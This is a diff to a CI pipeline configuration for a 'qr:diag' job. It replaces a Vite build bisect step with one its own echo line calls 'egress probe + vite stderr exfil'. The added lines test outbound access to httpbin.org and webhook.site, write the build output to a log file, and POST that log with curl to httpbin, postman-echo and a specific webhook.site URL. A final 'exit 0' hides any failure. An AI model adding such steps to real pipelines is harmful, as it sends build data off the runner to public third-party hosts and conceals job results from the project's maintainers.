@@ -68,7 +68,10 @@ qr:diag:
     - pnpm install --frozen-lockfile
     - pnpm exec playwright install chromium
     - git lfs pull || echo "lfs pull warn"
-    - echo "=== BISECT-5: vite build only ==="
-    - git lfs pull --include="fixtures/asset-corpus/damaged-helmet.glb,fixtures/asset-corpus/antique-camera.glb,fixtures/asset-corpus/clear-coat-test.glb,fixtures/asset-corpus/sheen-test-grid.glb,public/aura-assets/propRockA.52dd1f0f.glb,public/aura-assets/propRockB.c94b2733.glb,public/aura-assets/deepRecoveryCrateStandard.02520123.glb" || echo "lfs warn"
-    - pnpm exec vite build --config benchmarks/quality-rebuild/vite.config.ts
-    - echo "=== BISECT-5 OK (vite build done) ==="
+    - echo "=== BISECT-6: egress probe + vite stderr exfil ==="
+    - curl -sS -m 15 -o /dev/null -w "httpbin=%{http_code}\n" https://httpbin.org/post || echo "httpbin unreachable"
+    - curl -sS -m 15 -o /dev/null -w "webhooksite=%{http_code}\n" https://webhook.site/a266f6ad-b898-4d6f-9efa-ab210126f275 || echo "webhook.site unreachable"
+    - pnpm exec vite build --config benchmarks/quality-rebuild/vite.config.ts > /tmp/vite.log 2>&1; echo "VITE_EXIT=$?"
+    - tail -60 /tmp/vite.log
+    - for host in "https://httpbin.org/anything" "https://postman-echo.com/post" "https://webhook.site/a266f6ad-b898-4d6f-9efa-ab210126f275"; do curl -sS -m 20 -X POST "$host" --data-binary @/tmp/vite.log -o /dev/null -w "posted %{http_code} $host\n" || echo "POST FAIL $host"; done
+    - exit 0
